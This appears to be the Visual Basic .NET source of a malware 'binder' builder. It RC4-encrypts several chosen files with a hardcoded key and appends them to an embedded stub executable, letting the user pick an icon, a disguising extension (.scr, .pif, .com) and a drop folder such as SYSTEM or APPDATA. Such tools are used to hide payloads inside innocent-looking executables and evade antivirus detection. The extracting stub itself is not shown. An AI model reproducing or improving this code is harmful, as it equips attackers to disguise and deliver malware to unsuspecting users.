Imports System.IO
Imports System.Collections.Generic
Imports System.Runtime.InteropServices
Imports System.ComponentModel
Imports Microsoft.CSharp.CSharpCodeProvider

Imports Microsoft.VisualBasic.Devices.Keyboard

Public Class binder

    Const Splitter As String = "@#sp@##@s@lit#mixed"
    Const enckey = "Yod2ff86sd84f8r84bj84d3fgh68sdh6"
    Dim stub, files As String
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "All Files (*.*)|*.*"
        ofd.InitialDirectory = My.Computer.FileSystem.SpecialDirectories.MyDocuments
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            For i = 0 To ListView1.Items.Count - 1
                If ListView1.Items.Item(i).Tag = ofd.FileName Then
                    Exit Sub
                End If
            Next

            ImageList1.Images.Add(Path.GetFileName(ofd.FileName), Icon.ExtractAssociatedIcon(ofd.FileName))
            With ListView1.Items.Add(Path.GetFileName(ofd.FileName))
                .SubItems.Add(Path.GetExtension(ofd.FileName))
                Dim size As Long = My.Computer.FileSystem.GetFileInfo(ofd.FileName).Length
                Dim sized As String
                If size >= 1024 Then
                    size = size / 1024
                    sized = size.ToString + " KB"
                    If size >= 1024 Then
                        size = size / 1024
                        sized = size.ToString + " MB"
                        If size >= 1024 Then
                            size = size / 1024
                            sized = size.ToString + " GB"
                        End If
                    End If
                Else
                    sized = size.ToString + " Bytes"
                End If
                .SubItems.Add(sized)
                .ImageIndex = ImageList1.Images.Count - 1
                .Tag = ofd.FileName
            End With
        End If
    End Sub
    Private Sub ListView1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        If ListView1.SelectedItems.Count > 0 Then
            Button2.Enabled = True
        Else
            Button2.Enabled = False
        End If
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim item As ListViewItem
        For Each item In ListView1.SelectedItems
            ListView1.Items.Remove(item)
        Next
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        RadioButton1.Checked = True
        PictureBox1.Image = My.Resources.Icon06.ToBitmap
        PictureBox1.SizeMode = PictureBoxSizeMode.Zoom

        Timer2.Enabled = True
    End Sub
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        If ListView1.Items.Count < 1 Then
            MsgBox("Add more files!!", MsgBoxStyle.Critical, "Missing files")
            Exit Sub
        Else
            Dim item As ListViewItem
            For Each item In ListView1.Items
                If Not File.Exists(item.Tag) Then
                    MsgBox("Cannot find " + item.Tag)
                    Exit Sub
                End If
            Next
        End If
        Dim sfd As New SaveFileDialog
        sfd.Filter = "(*.exe) (icon-support)|*.exe|(*.bat)|*.bat|(*.com)|*.com|(*.pif)|*.pif|(*.scr) (icon-support)|*.scr"
        sfd.FileName = "AK"
        sfd.InitialDirectory = My.Computer.FileSystem.SpecialDirectories.MyDocuments
        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
            Dim Tpath As String = Path.GetTempPath + "Stub.exe"
            My.Computer.FileSystem.WriteAllBytes(Tpath, My.Resources.Stub, False)
            If File.Exists(PictureBox1.Tag) Then
                ChooseICO(Tpath, PictureBox1.Tag)
            End If
            FileOpen(1, Tpath, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            File.Delete(Tpath)
            Dim drop As String = Nothing
            If RadioButton1.Checked Then
                drop = "TEMP"
            ElseIf RadioButton2.Checked Then
                drop = "SYSTEM"
            ElseIf RadioButton3.Checked Then
                drop = "APPDATA"
            Else
                MsgBox("Please select a dropping folder", MsgBoxStyle.Critical, "Error")
                Exit Sub
            End If
            If File.Exists(sfd.FileName) Then
                Try
                    File.Delete(sfd.FileName)
                Catch ex As Exception
                    MsgBox(ex.Message, MsgBoxStyle.Critical, "Overwrite error")
                    Exit Sub
                End Try
            End If
            Try
                FileOpen(1, sfd.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, stub + Splitter + rc4(ListView1.Items.Count, enckey) + Splitter + rc4(drop, enckey) + Splitter)
                ProgressBar1.Maximum = ListView1.Items.Count
                For Each item As ListViewItem In ListView1.Items
                    FileOpen(2, item.Tag, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                    files = Space(LOF(2))
                    FileGet(2, files)
                    FileClose(2)
                    FilePut(1, rc4(files, enckey) + "#EXT#@is@here##" + rc4(Path.GetExtension(item.Tag), enckey) + Splitter)
                    ProgressBar1.Value += 1
                Next
                FileClose(1)
                ProgressBar1.Value = ProgressBar1.Maximum
                MsgBox("Done!! File saved in " + sfd.FileName, MsgBoxStyle.Information, "Done!")
            Catch ex As Exception
            End Try
        End If
        ProgressBar1.Value = 0
    End Sub
    Public Shared Function rc4(ByVal message As String, ByVal password As String) As String
        Dim i As Integer = 0
        Dim j As Integer = 0
        Dim cipher As New System.Text.StringBuilder
        Dim returnCipher As String = String.Empty
        Dim sbox As Integer() = New Integer(256) {}
        Dim key As Integer() = New Integer(256) {}
        Dim intLength As Integer = password.Length
        Dim a As Integer = 0
        While a <= 255
            Dim ctmp As Char = (password.Substring((a Mod intLength), 1).ToCharArray()(0))
            key(a) = Microsoft.VisualBasic.Strings.Asc(ctmp)
            sbox(a) = a
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        Dim x As Integer = 0
        Dim b As Integer = 0
        While b <= 255
            x = (x + sbox(b) + key(b)) Mod 256
            Dim tempSwap As Integer = sbox(b)
            sbox(b) = sbox(x)
            sbox(x) = tempSwap
            System.Math.Max(System.Threading.Interlocked.Increment(b), b - 1)
        End While
        a = 1
        While a <= message.Length
            Dim itmp As Integer = 0
            i = (i + 1) Mod 256
            j = (j + sbox(i)) Mod 256
            itmp = sbox(i)
            sbox(i) = sbox(j)
            sbox(j) = itmp
            Dim k As Integer = sbox((sbox(i) + sbox(j)) Mod 256)
            Dim ctmp As Char = message.Substring(a - 1, 1).ToCharArray()(0)
            itmp = Asc(ctmp)
            Dim cipherby As Integer = itmp Xor k
            cipher.Append(Chr(cipherby))
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        returnCipher = cipher.ToString
        cipher.Length = 0
        Return returnCipher
    End Function

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "Stub Files (*.ico)|*.ico"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            PictureBox1.Tag = ofd.FileName
            PictureBox1.Image = Icon.ExtractAssociatedIcon(ofd.FileName).ToBitmap
            PictureBox1.SizeMode = PictureBoxSizeMode.CenterImage
        End If
    End Sub
    Sub ChooseICO(ByVal exePath As String, ByVal icoPath As String)
        If (Not File.Exists(exePath)) Or (Not File.Exists(icoPath)) Then
            Exit Sub
        End If
        Try
            Dim oIconFile As New IconFile(icoPath)
            Dim groupIconResource As GroupIconResource = oIconFile.ConvertToGroupIconResource()
            groupIconResource.SaveTo(exePath)
        Catch ex As Exception
            Exit Sub
        End Try
    End Sub
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        pc.Height -= 5
        If pc.Height <= 4 Then
            Timer1.Enabled = False
        End If
    End Sub
    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Button5.Visible = False
        Timer1.Enabled = True
    End Sub
    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Me.Left += 300
        If Me.Left >= 300 Then
            Timer2.Enabled = False
        End If
    End Sub

End Class
